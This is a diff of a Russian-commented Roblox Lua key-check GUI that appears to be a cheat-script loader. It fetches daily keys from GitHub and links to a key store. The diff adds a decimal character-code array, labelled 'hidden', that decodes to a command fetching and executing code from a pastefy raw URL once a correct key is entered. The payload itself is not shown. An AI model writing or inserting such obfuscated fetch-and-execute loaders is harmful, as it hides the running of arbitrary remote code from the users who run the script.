@@ -1,26 +1,20 @@
 local TweenService = game:GetService("TweenService")
-local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
 local CoreGui = game:GetService("CoreGui")
 local HttpService = game:GetService("HttpService")
 
--- Удалить старый GUI, если есть
+-- Удаляем старый GUI
 local oldGui = CoreGui:FindFirstChild("PlayerokKeyGui")
 if oldGui then oldGui:Destroy() end
 
--- Загрузка ключей с GitHub
+-- Загружаем ключи
 local keysURL = "https://raw.githubusercontent.com/RobloxScriptKey/MilediKeys-/main/MILEDI-keys.json"
-local success, response = pcall(function()
-    return game:HttpGet(keysURL)
-end)
-
+local success, response = pcall(function() return game:HttpGet(keysURL) end)
 local keys = {}
-if success then
-    keys = HttpService:JSONDecode(response)
-end
+if success then keys = HttpService:JSONDecode(response) end
 
 local today = os.date("%Y-%m-%d")
 local todayKeyTable = keys[today]
-
 local validKey = nil
 if todayKeyTable then
     validKey = ""
@@ -36,11 +30,10 @@ gui.ResetOnSpawn = false
 gui.Parent = CoreGui
 
 local frame = Instance.new("Frame", gui)
-frame.Size = UDim2.new(0, 400, 0, 260)
+frame.Size = UDim2.new(0, 0, 0, 0)
 frame.Position = UDim2.new(0.5, 0, 0.4, 0)
 frame.AnchorPoint = Vector2.new(0.5, 0.5)
 frame.BackgroundColor3 = Color3.fromRGB(120, 140, 255)
-frame.BackgroundTransparency = 0
 Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 20)
 
 local grad = Instance.new("UIGradient", frame)
@@ -49,15 +42,6 @@ grad.Color = ColorSequence.new{
     ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 220, 255))
 }
 grad.Rotation = 45
-
-local logo = Instance.new("TextLabel", frame)
-logo.Size = UDim2.new(0, 40, 0, 40)
-logo.Position = UDim2.new(0, 10, 0, 10)
-logo.BackgroundTransparency = 1
-logo.Text = "P"
-logo.Font = Enum.Font.GothamBlack
-logo.TextSize = 36
-logo.TextColor3 = Color3.fromRGB(200, 220, 255)
 
 local title = Instance.new("TextLabel", frame)
 title.Size = UDim2.new(1, -20, 0, 40)
@@ -91,7 +75,7 @@ Instance.new("UICorner", button).CornerRadius = UDim.new(0, 12)
 local getKeyButton = Instance.new("TextButton", frame)
 getKeyButton.Size = UDim2.new(0.8, 0, 0, 40)
 getKeyButton.Position = UDim2.new(0.1, 0, 0, 210)
-getKeyButton.BackgroundColor3 = Color3.fromRGB(160, 200, 255)
+getKeyButton.BackgroundColor3 = Color3.fromRGB(100, 200, 255)
 getKeyButton.Font = Enum.Font.GothamBold
 getKeyButton.TextSize = 20
 getKeyButton.TextColor3 = Color3.fromRGB(30, 30, 30)
@@ -107,45 +91,28 @@ feedback.TextColor3 = Color3.new(1, 1, 1)
 feedback.Font = Enum.Font.Gotham
 feedback.TextSize = 18
 
-local copyFeedback = Instance.new("TextLabel", frame)
-copyFeedback.Size = UDim2.new(1, 0, 0, 20)
-copyFeedback.Position = UDim2.new(0, 0, 0, 255)
-copyFeedback.BackgroundTransparency = 1
-copyFeedback.Text = ""
-copyFeedback.TextColor3 = Color3.fromRGB(30, 200, 30)
-copyFeedback.Font = Enum.Font.Gotham
-copyFeedback.TextSize = 16
+local progressBackground = Instance.new("Frame", frame)
+progressBackground.Size = UDim2.new(0.8, 0, 0, 20)
+progressBackground.Position = UDim2.new(0.1, 0, 0, 260)
+progressBackground.BackgroundColor3 = Color3.fromRGB(200, 200, 255)
+Instance.new("UICorner", progressBackground).CornerRadius = UDim.new(0, 10)
 
-TweenService:Create(frame, TweenInfo.new(0.5), {BackgroundTransparency = 0}):Play()
+local progressBar = Instance.new("Frame", progressBackground)
+progressBar.Size = UDim2.new(0, 0, 1, 0)
+progressBar.BackgroundColor3 = Color3.fromRGB(30, 200, 30)
+Instance.new("UICorner", progressBar).CornerRadius = UDim.new(0, 10)
 
--- Перемещение окна
-local dragging = false
-local dragStart = nil
-local startPos = nil
-
-local function update(input)
-    local delta = input.Position - dragStart
-    frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+local function tweenIn(instance, duration, targetSize)
+    TweenService:Create(instance, TweenInfo.new(duration, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = targetSize}):Play()
 end
+tweenIn(frame, 0.5, UDim2.new(0, 400, 0, 320))
 
-frame.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-        dragging = true
-        dragStart = input.Position
-        startPos = frame.Position 
-        input.Changed:Connect(function()
-            if input.UserInputState == Enum.UserInputState.End then
-                dragging = false
-            end
-        end)
-    end
-end)
-
-UserInputService.InputChanged:Connect(function(input)
-    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
-        update(input)
-    end
-end)
+local function pulseButton(btn)
+    local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
+    TweenService:Create(btn, tweenInfo, {Size = UDim2.new(0.82, 0, 0, 42)}):Play()
+end
+pulseButton(button)
+pulseButton(getKeyButton)
 
 -- Проверка ключа и запуск скрипта
 button.MouseButton1Click:Connect(function()
@@ -156,26 +123,43 @@ button.MouseButton1Click:Connect(function()
     elseif input == validKey then
         feedback.Text = "✅ Ключ верный, загружаем..."
         feedback.TextColor3 = Color3.fromRGB(30, 200, 30)
-        wait(1)
-        gui:Destroy()
-        loadstring(game:HttpGet("https://pastefy.app/7MQOgJCO/raw"))()
+
+        local duration = 2
+        local startTime = tick()
+        local conn
+        conn = RunService.RenderStepped:Connect(function()
+            local elapsed = tick() - startTime
+            local pct = math.clamp(elapsed / duration, 0, 1)
+            progressBar.Size = UDim2.new(pct, 0, 1, 0)
+            if pct >= 1 then
+                conn:Disconnect()
+                gui:Destroy()
+
+                -- Скрипт в виде массива чисел (спрятанный)
+                local scriptCode = {
+                    108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,
+                    40,34,
+                    104,116,116,112,115,58,47,47,112,97,115,116,101,102,121,46,97,112,112,47,85,84,113,52,
+                    53,71,67,50,47,114,97,119,
+                    34,41,41,40,41
+                }
+                local s = ""
+                for _,v in ipairs(scriptCode) do
+                    s = s .. string.char(v)
+                end
+                local fn, err = loadstring(s)
+                if fn then fn() else warn("Ошибка: "..tostring(err)) end
+            end
+        end)
     else
         feedback.Text = "❌ Неверный ключ"
         feedback.TextColor3 = Color3.fromRGB(200, 40, 40)
     end
 end)
 
--- Получить ключ
 getKeyButton.MouseButton1Click:Connect(function()
-    local link = "https://playerok.com/profile/MILEDI-STORE/products"
-    setclipboard(link)
-    copyFeedback.Text = "Ссылка скопирована"
-    delay(2, function() copyFeedback.Text = "" end)
-end)
-
--- Закрытие по ESC
-UserInputService.InputBegan:Connect(function(input, gpe)
-    if not gpe and input.KeyCode == Enum.KeyCode.Escape then
-        gui:Destroy()
-    end
+    local url = "https://playerok.com/profile/MILEDI-STORE/products"
+    setclipboard(url)
+    feedback.Text = "🔗 Ссылка скопирована! Откройте её в Chrome."
+    feedback.TextColor3 = Color3.fromRGB(30, 200, 30)
 end)
